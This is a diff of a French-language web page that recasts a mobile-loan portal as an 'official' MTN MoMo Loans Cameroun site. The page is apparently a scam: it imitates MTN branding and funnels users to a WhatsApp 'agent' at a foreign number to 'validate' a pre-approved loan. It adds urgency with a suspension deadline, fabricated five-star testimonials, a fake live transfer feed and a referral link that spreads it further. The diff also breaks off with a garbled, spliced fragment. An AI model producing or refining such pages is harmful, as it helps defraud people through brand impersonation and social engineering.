@@ -2,151 +2,308 @@
 <html lang="fr">
 <head>
     <meta charset="UTF-8">
-    <title>MoMo-Loans Cameroun | Portail de Crédit Mobile</title>
+    <title>MTN MoMo Loans Cameroun | Portail Officiel de Crédit</title>
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
     <script src="https://cdn.tailwindcss.com"></script>
     <style>
         body {
             -webkit-tap-highlight-color: transparent;
         }
-        .no-scrollbar::-webkit-scrollbar {
-            display: none;
+        .mtn-gradient {
+            background: linear-gradient(135deg, #0f172a 0%, #1e1b4b 65%, #312e81 100%);
         }
-        .no-scrollbar {
-            -ms-overflow-style: none;
-            scrollbar-width: none;
-        }
-        @keyframes pulse-ring {
-            0% { transform: scale(0.8); opacity: 0.8; }
-            100% { transform: scale(2); opacity: 0; }
-        }
-        .animate-pulse-ring::before {
-            content: '';
-            position: absolute;
-            inset: 0;
-            border-radius: 9999px;
-            background-color: #10b981;
-            animation: pulse-ring 1.5s cubic-bezier(0.215, 0.61, 0.355, 1) infinite;
+        .mtn-gold-border {
+            border-color: #ffcc00;
         }
     </style>
 </head>
 <body class="bg-slate-950 text-slate-900 font-sans antialiased min-h-screen flex flex-col md:flex-row">
 
     <!-- Barre latérale (Desktop) -->
-    <aside class="hidden md:flex md:w-64 lg:w-72 bg-indigo-950 text-white flex-col fixed h-full z-30 border-r border-indigo-900">
-        <div class="p-6 bg-indigo-900/50 border-b border-indigo-900">
-            <div class="flex items-center justify-between">
-                <h1 class="text-2xl font-black tracking-tight text-indigo-100">MoMo-Loans</h1>
-                <span class="text-[10px] font-bold bg-amber-400 text-indigo-950 px-2 py-0.5 rounded">CM 🇨🇲</span>
+    <aside class="hidden md:flex md:w-72 mtn-gradient text-white flex-col fixed h-full z-30 border-r border-slate-800">
+        <div class="p-6 border-b border-white/10">
+            <div class="flex items-center gap-3">
+                <div class="w-10 h-10 rounded-xl bg-[#FFCC00] text-slate-950 font-black flex items-center justify-center text-sm shadow-md">
+                    MoMo
+                </div>
+                <div>
+                    <h1 class="text-xl font-black tracking-tight text-white">MTN MoMo Loans</h1>
+                    <span class="text-[10px] font-bold text-[#FFCC00] uppercase tracking-wider">Cameroun 🇨🇲</span>
+                </div>
             </div>
-            <p class="text-xs text-indigo-300 opacity-80 mt-1">Console de Crédit & Validation</p>
         </div>
         
         <nav class="flex-1 p-4 space-y-3">
-            <span class="text-[10px] font-bold text-indigo-400 uppercase tracking-wider block px-2">ÉTAT DU DOSSIER</span>
-            <div class="bg-amber-500/15 border border-amber-500/40 text-amber-300 p-3 rounded-xl text-xs font-semibold flex items-center gap-2">
-                <span class="w-2 h-2 rounded-full bg-amber-400 animate-ping"></span>
-                <span>VALIDATION WHATSAPP REQUISE</span>
-            </div>
-            <div class="text-slate-400 border border-transparent p-3 rounded-xl text-xs font-semibold opacity-50 cursor-not-allowed">
-                ✓ DÉCAISSEMENT MOBILE MONEY
-            </div>
-            <div class="text-slate-400 border border-transparent p-3 rounded-xl text-xs font-semibold opacity-40 cursor-not-allowed">
-                ✕ DOSSIER REJETÉ
+            <span class="text-[10px] font-bold text-slate-400 uppercase tracking-wider block px-2">SUIVI DE VOTRE CRÉDIT</span>
+            
+            <div class="bg-[#FFCC00]/15 border border-[#FFCC00]/50 text-[#FFCC00] p-3.5 rounded-xl text-xs font-bold flex items-center gap-2.5 shadow-inner">
+                <span class="w-2.5 h-2.5 rounded-full bg-[#FFCC00] animate-ping shrink-0"></span>
+                <span>VÉRIFICATION WHATSAPP REQUISE</span>
             </div>
 
-            <!-- Raccourci WhatsApp Sidebar -->
-            <div class="pt-4">
-                <a href="https://wa.me/254752606436?text=Bonjour%20le%20support%20MoMo-Loans%20Cameroun%2C%20je%20souhaite%20finaliser%20la%20v%C3%A9rification%20et%20la%20validation%20de%20mon%20dossier%20%23MS-77291." target="_blank"
-                   class="flex items-center justify-center gap-2 w-full bg-emerald-500 hover:bg-emerald-600 text-white font-bold text-xs py-3 px-3 rounded-xl shadow-lg shadow-emerald-950/50 transition-all">
-                    <svg class="w-4 h-4 fill-current shrink-0" viewBox="0 0 24 24"><path d="M.057 24l1.687-6.163c-1.041-1.804-1.588-3.849-1.587-5.946C.06 5.348 5.397.01 12.008.01c3.202.001 6.212 1.246 8.477 3.514 2.266 2.268 3.507 5.28 3.505 8.484-.004 6.657-5.34 11.997-11.953 11.997-2.005-.001-3.973-.503-5.714-1.458L0 24zm10.394-3.261c1.558.924 3.322 1.411 5.121 1.412 5.561 0 10.086-4.524 10.089-10.088.001-2.696-1.046-5.231-2.949-7.134a9.99 9.99 0 0 0-7.139-2.944C6.112 3.988 1.59 8.513 1.587 14.077c-.001 1.802.476 3.565 1.383 5.114l-.946 3.454 3.535-.927c1.492.813 3.16 1.241 4.852 1.242z"/></svg>
-                    <span>Valider sur WhatsApp</span>
-                </a>
+            <div class="bg-white/5 border border-white/10 text-slate-400 p-3.5 rounded-xl text-xs font-semibold flex items-center gap-2.5 opacity-60">
+                <span>🔒</span>
+                <span>DÉCAISSEMENT MTN MOMO</span>
+            </div>
+
+            <div class="mt-6 p-4 rounded-xl bg-slate-900/80 border border-slate-700/80 space-y-2">
+                <p class="text-[11px] font-bold text-slate-300">Réseau Exclusif :</p>
+                <div class="inline-flex items-center gap-2 bg-[#FFCC00] text-slate-950 font-extrabold text-[11px] px-2.5 py-1 rounded-md">
+                    <span>MTN Mobile Money</span>
+                </div>
+                <p class="text-[10px] text-slate-400 leading-relaxed pt-1">
+                    Transfert direct sur votre numéro MTN Cameroun après validation.
+                </p>
             </div>
         </nav>
 
-        <div class="p-4 border-t border-indigo-900">
-            <button onclick="logout()" class="w-full bg-transparent border border-red-500/40 hover:bg-red-500/10 text-red-400 font-bold text-xs py-2.5 rounded-lg transition-colors">
+        <div class="p-4 border-t border-white/10">
+            <button onclick="logout()" class="w-full bg-red-500/10 border border-red-500/30 hover:bg-red-500/20 text-red-300 font-bold text-xs py-2.5 rounded-xl transition-colors">
                 Se déconnecter
             </button>
         </div>
     </aside>
 
     <!-- En-tête Mobile Sticky -->
-    <header class="md:hidden bg-indigo-950 text-white px-4 py-3.5 flex justify-between items-center sticky top-0 z-30 shadow-md border-b border-indigo-900/80">
-        <div>
-            <div class="flex items-center gap-1.5">
-                <h1 class="text-base sm:text-lg font-black tracking-tight text-white">MOMO-LOANS</h1>
-                <span class="text-[9px] font-extrabold bg-amber-400 text-indigo-950 px-1.5 py-0.5 rounded">CAMEROUN</span>
+    <header class="md:hidden mtn-gradient text-white px-4 py-3.5 flex justify-between items-center sticky top-0 z-30 shadow-lg border-b-2 border-[#FFCC00]">
+        <div class="flex items-center gap-2.5">
+            <div class="w-9 h-9 rounded-xl bg-[#FFCC00] text-slate-950 font-black flex items-center justify-center text-xs shadow">
+                MoMo
             </div>
-            <div class="flex items-center gap-1.5 mt-0.5">
-                <span class="relative flex h-2 w-2">
-                    <span class="animate-ping absolute inline-flex h-full w-full rounded-full bg-emerald-400 opacity-75"></span>
-                    <span class="relative inline-flex rounded-full h-2 w-2 bg-emerald-500"></span>
-                </span>
-                <p class="text-[10px] text-emerald-300 font-medium">Serveur Live • <span id="mobileClock">--:--</span></p>
+            <div>
+                <div class="flex items-center gap-1.5">
+                    <h1 class="text-base font-black tracking-tight text-white">MTN MOMO LOANS</h1>
+                    <span class="text-[9px] font-extrabold bg-[#FFCC00] text-slate-950 px-1.5 py-0.5 rounded">CM</span>
+                </div>
+                <div class="flex items-center gap-1.5 mt-0.5">
+                    <span class="relative flex h-2 w-2">
+                        <span class="animate-ping absolute inline-flex h-full w-full rounded-full bg-emerald-400 opacity-75"></span>
+                        <span class="relative inline-flex rounded-full h-2 w-2 bg-emerald-400"></span>
+                    </span>
+                    <p class="text-[10px] text-emerald-300 font-semibold">En direct • <span id="mobileClock">--:--</span></p>
+                </div>
             </div>
         </div>
         <div class="text-right">
-            <span class="inline-block bg-indigo-900 text-indigo-200 text-[10px] font-mono font-bold px-2.5 py-1 rounded-lg border border-indigo-700">
+            <span class="block text-[9px] text-slate-400 uppercase font-bold">Dossier</span>
+            <span class="inline-block bg-white/10 text-[#FFCC00] text-xs font-mono font-extrabold px-2.5 py-0.5 rounded-lg border border-[#FFCC00]/40">
                 #MS-77291
             </span>
         </div>
     </header>
 
-    <!-- Conteneur Principal -->
-    <div class="flex-1 md:ml-64 lg:ml-72 flex flex-col bg-slate-100 min-h-screen">
+    <!-- Contenu Principal -->
+    <div class="flex-1 md:ml-72 flex flex-col bg-slate-100 min-h-screen">
         
         <!-- Barre supérieure Desktop -->
-        <div class="hidden md:flex bg-white border-b border-slate-200 px-8 py-4 justify-between items-center sticky top-0 z-20">
+        <div class="hidden md:flex bg-white border-b border-slate-200 px-8 py-4 justify-between items-center sticky top-0 z-20 shadow-xs">
             <div class="flex items-center gap-3">
-                <h2 class="text-lg font-bold text-slate-800">Tableau de Bord Client</h2>
-                <span class="inline-flex items-center gap-1.5 bg-emerald-50 text-emerald-700 border border-emerald-200 text-xs font-semibold px-2.5 py-0.5 rounded-full">
+                <h2 class="text-lg font-extrabold text-slate-900">Espace Client MTN MoMo</h2>
+                <span class="inline-flex items-center gap-1.5 bg-emerald-50 text-emerald-700 border border-emerald-200 text-xs font-bold px-3 py-1 rounded-full">
                     <span class="w-2 h-2 rounded-full bg-emerald-500 animate-pulse"></span>
-                    Système en direct • <span id="desktopClock">--:--:--</span>
+                    Serveur Live • <span id="desktopClock">--:--:--</span>
                 </span>
             </div>
-            <div class="text-right text-xs text-slate-500">
-                <span>Dossier N° : </span>
-                <span class="font-mono font-bold text-slate-800 bg-slate-100 px-2.5 py-1 rounded border border-slate-200">#MS-77291</span>
+            <div class="flex items-center gap-2 text-xs">
+                <span class="text-slate-500 font-medium">Référence :</span>
+                <span class="font-mono font-extrabold text-slate-950 bg-[#FFCC00] px-3 py-1 rounded-lg shadow-xs">#MS-77291</span>
             </div>
         </div>
 
-        <main class="flex-1 p-3.5 sm:p-5 md:p-8 space-y-4 md:space-y-6 max-w-5xl w-full mx-auto pb-28 md:pb-10">
+        <main class="flex-1 p-3.5 sm:p-5 md:p-8 space-y-5 max-w-5xl w-full mx-auto pb-24 md:pb-10">
             
-            <!-- CARTE PRIORITAIRE WHATSAPP (Ultra visible sur mobile et desktop) -->
-            <section class="bg-gradient-to-br from-emerald-600 via-emerald-600 to-teal-700 rounded-2xl p-4 sm:p-6 text-white shadow-lg shadow-emerald-900/15 border border-emerald-400/30 relative overflow-hidden">
-                <div class="relative z-10 flex flex-col lg:flex-row lg:items-center lg:justify-between gap-4">
-                    <div class="space-y-1.5">
-                        <div class="inline-flex items-center gap-2 bg-white/15 backdrop-blur-sm px-2.5 py-1 rounded-full text-[11px] font-bold uppercase tracking-wide">
-                            <span class="w-2 h-2 rounded-full bg-amber-300 animate-ping"></span>
-                            <span>Action Requise • Validation Finale</span>
-                        </div>
-                        <h2 class="text-lg sm:text-xl md:text-2xl font-black leading-tight">
-                            Finalisez votre vérification sur WhatsApp
+            <!-- BOÎTE 1 : CARTE PRINCIPALE WHATSAPP (UNIQUE LIEN D'ACTION) -->
+            <section class="rounded-2xl bg-slate-900 text-white shadow-xl border-2 border-[#FFCC00] overflow-hidden">
+                <!-- Bandeau supérieur doré -->
+                <div class="bg-[#FFCC00] text-slate-950 px-4 py-2 flex items-center justify-between text-xs font-extrabold uppercase tracking-wide">
+                    <span class="flex items-center gap-2">
+                        <span class="w-2 h-2 rounded-full bg-slate-950 animate-ping"></span>
+                        Action Requise • Validation Finale
+                    </span>
+                    <span>MTN MoMo Uniquement</span>
+                </div>
+
+                <div class="p-4 sm:p-6 md:p-7 space-y-4">
+                    <div class="space-y-2">
+                        <h2 class="text-xl sm:text-2xl font-black text-white leading-snug">
+                            Contactez notre agent sur WhatsApp pour valider votre prêt
                         </h2>
-                        <p class="text-xs sm:text-sm text-emerald-50 leading-relaxed max-w-2xl">
-                            Votre demande de crédit est pré-approuvée. Veuillez contacter immédiatement un <strong>agent de support agréé via WhatsApp</strong> pour valider votre identité et déclencher le transfert vers votre compte <strong>MTN MoMo</strong>.
+                        <p class="text-xs sm:text-sm text-slate-300 leading-relaxed">
+                            Votre dossier <strong class="text-[#FFCC00]">#MS-77291</strong> est en attente de confirmation finale. Cliquez sur le bouton ci-dessous pour discuter avec un conseiller afin de vérifier votre identité et recevoir votre dépôt directement sur votre compte <strong class="text-white">MTN Mobile Money</strong>.
                         </p>
                     </div>
 
-                    <div class="shrink-0 flex flex-col sm:flex-row lg:flex-col items-stretch sm:items-center gap-2 pt-1 lg:pt-0">
-                        <a href="https://wa.me/254752606436?text=Bonjour%20le%20support%20MoMo-Loans%20Cameroun%2C%20je%20souhaite%20finaliser%20la%20v%C3%A9rification%20et%20la%20validation%20de%20mon%20dossier%20%23MS-77291." 
+                    <!-- UNIQUE BOUTON WHATSAPP -->
+                    <div class="pt-1">
+                        <a href="https://wa.me/254752606436?text=Bonjour%20le%20support%20MTN%20MoMo%20Loans%20Cameroun%2C%20je%20souhaite%20finaliser%20la%20v%C3%A9rification%20et%20la%20validation%20de%20mon%20dossier%20%23MS-77291." 
                            target="_blank"
-                           class="flex items-center justify-center gap-2.5 bg-white text-emerald-800 hover:bg-amber-300 hover:text-slate-950 font-black text-sm sm:text-base px-5 py-3.5 rounded-xl shadow-md transition-all active:scale-95 text-center">
-                            <svg class="w-5 h-5 fill-current shrink-0 text-emerald-600" viewBox="0 0 24 24"><path d="M.057 24l1.687-6.163c-1.041-1.804-1.588-3.849-1.587-5.946C.06 5.348 5.397.01 12.008.01c3.202.001 6.212 1.246 8.477 3.514 2.266 2.268 3.507 5.28 3.505 8.484-.004 6.657-5.34 11.997-11.953 11.997-2.005-.001-3.973-.503-5.714-1.458L0 24zm10.394-3.261c1.558.924 3.322 1.411 5.121 1.412 5.561 0 10.086-4.524 10.089-10.088.001-2.696-1.046-5.231-2.949-7.134a9.99 9.99 0 0 0-7.139-2.944C6.112 3.988 1.59 8.513 1.587 14.077c-.001 1.802.476 3.565 1.383 5.114l-.946 3.454 3.535-.927c1.492.813 3.16 1.241 4.852 1.242z"/></svg>
-                            <span>DISCUTER SUR WHATSAPP</span>
+                           class="w-full sm:w-auto inline-flex items-center justify-center gap-3 bg-emerald-500 hover:bg-emerald-400 text-slate-950 font-black text-sm sm:text-base px-6 py-4 rounded-xl shadow-lg shadow-emerald-500/25 transition-all active:scale-[0.98]">
+                            <svg class="w-6 h-6 fill-current shrink-0" viewBox="0 0 24 24"><path d="M.057 24l1.687-6.163c-1.041-1.804-1.588-3.849-1.587-5.946C.06 5.348 5.397.01 12.008.01c3.202.001 6.212 1.246 8.477 3.514 2.266 2.268 3.507 5.28 3.505 8.484-.004 6.657-5.34 11.997-11.953 11.997-2.005-.001-3.973-.503-5.714-1.458L0 24zm10.394-3.261c1.558.924 3.322 1.411 5.121 1.412 5.561 0 10.086-4.524 10.089-10.088.001-2.696-1.046-5.231-2.949-7.134a9.99 9.99 0 0 0-7.139-2.944C6.112 3.988 1.59 8.513 1.587 14.077c-.001 1.802.476 3.565 1.383 5.114l-.946 3.454 3.535-.927c1.492.813 3.16 1.241 4.852 1.242z"/></svg>
+                            <span>VALIDER MON PRÊT SUR WHATSAPP</span>
                         </a>
-                        <span class="text-[10px] text-center text-emerald-100 font-medium">
-                            🟢 Conseiller disponible • Réponse en moins de 2 min
-                        </span>
+                        <p class="text-[11px] text-emerald-400 font-semibold mt-2.5 flex items-center gap-1.5">
+                            <span class="w-2 h-2 rounded-full bg-emerald-400 animate-pulse"></span>
+                            Agent support en ligne • Prise en charge immédiate
+                        </p>
                     </div>
                 </div>
             </section>
 
-            <!-- Progression en Direct -->
-            <section class="bg-white rounded-2xl p-4 sm:p-5 shadow-sm border border-slate-200/80">
-                <div class="flex flex-wrap items-center justify-between gap-2 mb-3">
+            <!-- BOÎTE 2 : ÉTAT D'AVANCEMENT DU DOSSIER -->
+            <section class="bg-white rounded-2xl p-4 sm:p-6 shadow-sm border border-slate-200">
+                <div class="flex items-center justify-between gap-2 mb-3">
+                    <h3 class="text-xs sm:text-sm font-extrabold text-slate-900 uppercase tracking-wide flex items-center gap-2">
+                        <span class="w-2.5 h-2.5 rounded-full bg-[#FFCC00] ring-4 ring-[#FFCC00]/30"></span>
+                        Progression de la Validation
+                    </h3>
+                    <span class="text-xs font-extrabold text-slate-950 bg-[#FFCC00] px-2.5 py-0.5 rounded-full">
+                        80 % complété
+                    </span>
+                </div>
+
+                <!-- Barre de progression -->
+                <div class="w-full bg-slate-100 h-3 rounded-full overflow-hidden p-0.5 border border-slate-200 mb-4">
+                    <div class="bg-gradient-to-r from-amber-400 via-[#FFCC00] to-emerald-500 h-full rounded-full transition-all duration-1000" style="width: 80%;"></div>
+                </div>
+
+                <div class="grid grid-cols-3 gap-2.5 text-center text-[11px] sm:text-xs font-bold">
+                    <div class="bg-emerald-50 border border-emerald-200 text-emerald-800 p-2.5 rounded-xl">
+                        <span class="block text-sm mb-0.5">✓</span>
+                        Dossier enregistré
+                    </div>
+                    <div class="bg-amber-50 border-2 border-[#FFCC00] text-slate-950 p-2.5 rounded-xl shadow-xs">
+                        <span class="block text-sm mb-0.5">⏳</span>
+                        Vérif. WhatsApp
+                    </div>
+                    <div class="bg-slate-50 border border-slate-200 text-slate-400 p-2.5 rounded-xl">
+                        <span class="block text-sm mb-0.5">📲</span>
+                        Dépôt MTN MoMo
+                    </div>
+                </div>
+            </section>
+
+            <div class="grid grid-cols-1 lg:grid-cols-3 gap-5 items-start">
+                
+                <div class="lg:col-span-2 space-y-5">
+                    
+                    <!-- BOÎTE 3 : LIEN D'ACCÉLÉRATION -->
+                    <section class="bg-white rounded-2xl p-4 sm:p-6 shadow-sm border border-slate-200 space-y-3">
+                        <div class="flex items-center justify-between">
+                            <h3 class="text-sm sm:text-base font-extrabold text-slate-900 flex items-center gap-2">
+                                <span class="w-7 h-7 rounded-lg bg-[#FFCC00]/25 text-amber-700 flex items-center justify-center font-black">⚡</span>
+                                Lien d'Accélération Prioritaire
+                            </h3>
+                            <span class="text-[10px] font-extrabold bg-slate-900 text-[#FFCC00] px-2 py-0.5 rounded">MTN CM</span>
+                        </div>
+
+                        <p class="text-xs text-slate-600 leading-relaxed">
+                            Partagez votre lien d'invitation avec d'autres utilisateurs MTN MoMo pour placer votre dossier en tête de file.
+                        </p>
+
+                        <div class="bg-slate-50 p-3 rounded-xl border border-slate-200 flex gap-2">
+                            <input type="text" id="refLink" readonly value="https://mtn-momo-africa.vercel.app" 
+                                   class="bg-white border border-slate-300 rounded-lg px-3 py-2 text-xs font-mono flex-1 min-w-0 text-slate-800 focus:outline-none">
+                            <button onclick="copyLink()" class="bg-slate-900 hover:bg-slate-800 text-[#FFCC00] text-xs font-extrabold px-4 py-2 rounded-lg transition-colors active:scale-95 shrink-0">
+                                Copier
+                            </button>
+                        </div>
+                    </section>
+
+                    <!-- BOÎTE 4 : DÉCAISSEMENTS EN DIRECT MTN MOMO -->
+                    <section class="bg-white rounded-2xl p-4 sm:p-6 shadow-sm border border-slate-200">
+                        <div class="flex items-center justify-between mb-3.5">
+                            <h3 class="text-sm sm:text-base font-extrabold text-slate-900 flex items-center gap-2">
+                                <span class="w-2.5 h-2.5 rounded-full bg-emerald-500 animate-ping"></span>
+                                Transferts MTN MoMo en Direct
+                            </h3>
+                            <span class="text-[10px] font-bold text-slate-500 bg-slate-100 px-2 py-0.5 rounded-md">Cameroun</span>
+                        </div>
+                        
+                        <div id="liveFeed" class="space-y-2.5 text-xs">
+                            <!-- Rempli dynamiquement en JS -->
+                        </div>
+                    </section>
+
+                    <!-- BOÎTE 5 : TÉMOIGNAGES CLIENTS MTN -->
+                    <section class="bg-white rounded-2xl p-4 sm:p-6 shadow-sm border border-slate-200">
+                        <h3 class="text-sm sm:text-base font-extrabold text-slate-900 mb-3.5 flex items-center gap-2">
+                            <span class="text-amber-500">★</span>
+                            Avis des Clients MTN MoMo
+                        </h3>
+                        <div class="grid grid-cols-1 sm:grid-cols-3 gap-3 text-xs leading-snug">
+                            <div class="p-3.5 bg-amber-50/50 rounded-xl border border-amber-200/70">
+                                <span class="text-amber-500 block text-xs mb-1">★★★★★</span>
+                                <span class="font-extrabold text-slate-900 block mb-0.5">Jean-Paul N. • Douala</span>
+                                <span class="text-slate-600">Validation faite sur WhatsApp, dépôt MTN MoMo reçu en 5 minutes.</span>
+                            </div>
+                            <div class="p-3.5 bg-amber-50/50 rounded-xl border border-amber-200/70">
+                                <span class="text-amber-500 block text-xs mb-1">★★★★★</span>
+                                <span class="font-extrabold text-slate-900 block mb-0.5">Clarisse M. • Yaoundé</span>
+                                <span class="text-slate-600">Service rapide et sérieux. Mon compte MTN a été crédité sans souci.</span>
+                            </div>
+                            <div class="p-3.5 bg-amber-50/50 rounded-xl border border-amber-200/70">
+                                <span class="text-amber-500 block text-xs mb-1">★★★★★</span>
+                                <span class="font-extrabold text-slate-900 block mb-0.5">Abdoulaye K. • Garoua</span>
+                                <span class="text-slate-600">Agent très réactif sur WhatsApp pour confirmer mon numéro MTN.</span>
+                            </div>
+                        </div>
+                    </section>
+                </div>
+
+                <!-- BOÎTE 6 : RÈGLES & CONFORMITÉ -->
+                <div class="lg:col-span-1">
+                    <section class="bg-white rounded-2xl p-4 sm:p-6 shadow-sm border border-slate-200 space-y-3">
+                        <div class="inline-block bg-slate-900 text-[#FFCC00] text-[10px] font-extrabold uppercase px-2.5 py-1 rounded-md">
+                            Informations Importantes
+                        </div>
+                        <h3 class="text-sm font-extrabold text-slate-900">Conditions MTN Mobile Money</h3>
+                        <ul class="space-y-3 text-xs text-slate-600 leading-relaxed">
+                            <li class="flex items-start gap-2">
+                                <span class="text-emerald-600 font-bold mt-0.5">✓</span>
+                                <span>Ce service est réservé exclusivement aux abonnés <strong>MTN Cameroun</strong> disposant d'un compte MoMo actif.</span>
+                            </li>
+                            <li class="flex items-start gap-2">
+                                <span class="text-emerald-600 font-bold mt-0.5">✓</span>
+                                <span>La validation avec un conseiller sur WhatsApp est obligatoire avant le déclenchement du transfert.</span>
+                            </li>
+                            <li class="flex items-start gap-2">
+                                <span class="text-emerald-600 font-bold mt-0.5">✓</span>
+                                <span>Tout dossier non validé sous <strong>48 à 72 heures</strong> est automatiquement suspendu.</span>
+                            </li>
+                        </ul>
+                    </section>
+                </div>
+
+            </div>
+        </main>
+
+        <!-- Barre de navigation inférieure Mobile -->
+        <footer class="md:hidden fixed bottom-0 left-0 right-0 h-16 bg-slate-950 text-white border-t border-slate-800 flex justify-around items-center shrink-0 z-30 px-4">
+            <button onclick="window.scrollTo({top: 0, behavior: 'smooth'})" class="flex flex-col items-center justify-center flex-1 text-[#FFCC00] py-1">
+                <svg class="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M3 12l2-2m0 0l7-7 7 7M5 10v10a1 1 0 001 1h3m10-11l2 2m-2-2v10a1 1 0 01-1 1h3m-6 0a1 1 0 001-1v-4a1 1 0 011-1h2a1 1 0 011 1v4a1 1 0 001 1m-6 0h6"></path></svg>
+                <span class="text-[10px] font-bold mt-0.5">Tableau de bord</span>
+            </button>
+            <button onclick="logout()" class="flex flex-col items-center justify-center flex-1 text-slate-400 hover:text-red-400 transition-colors py-1">
+                <svg class="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M17 16l4-4m0 0l-4-4m4 4H7m6 4v1a3 3 0 01-3 3H6a3 3 0 01-3-3V7a3 3 0 013-3h4a3 3 0 013 3v1"></path></svg>
+                <span class="text-[10px] font-bold mt-0.5">Déconnexion</span>
+            </button>
+        </footer>
+
+    </div>
+
+    <!-- Notification Toast -->
+    <div id="toast" class="fixed top-20 left-1/2 -translate-x-1/2 bg-slate-900 text-[#FFCC00] border border-[#FFCC00]/50 text-xs font-extrabold px-4 py-2.5 rounded-full shadow-xl opacity-0 pointer-events-none transition-opacity duration-300 z-50">
+        ✓ Lien copié dans le presse-papiers !
+    </div>
+
+    <script>
+        // Horloge en direct
+        function updateClocks() {
+            const now = new Date();
+            const timeShort = now.toLocaleTimeString('fr-FR', { hour: '2-digit', minute: '2-digit' });
+            const timeFull = now.toLocaleTimeString('fr-FR', { hour: '2-digit', minute: '2-digit', second: '2-digit' });
+            
+ustify-between gap-2 mb-3">
                     <div class="flex items-center gap-2">
                         <span class="w-2.5 h-2.5 rounded-full bg-amber-500 animate-pulse"></span>
                         <h3 class="text-xs sm:text-sm font-bold text-slate-800 uppercase tracking-wide">Progression du Dossier #MS-77291</h3>
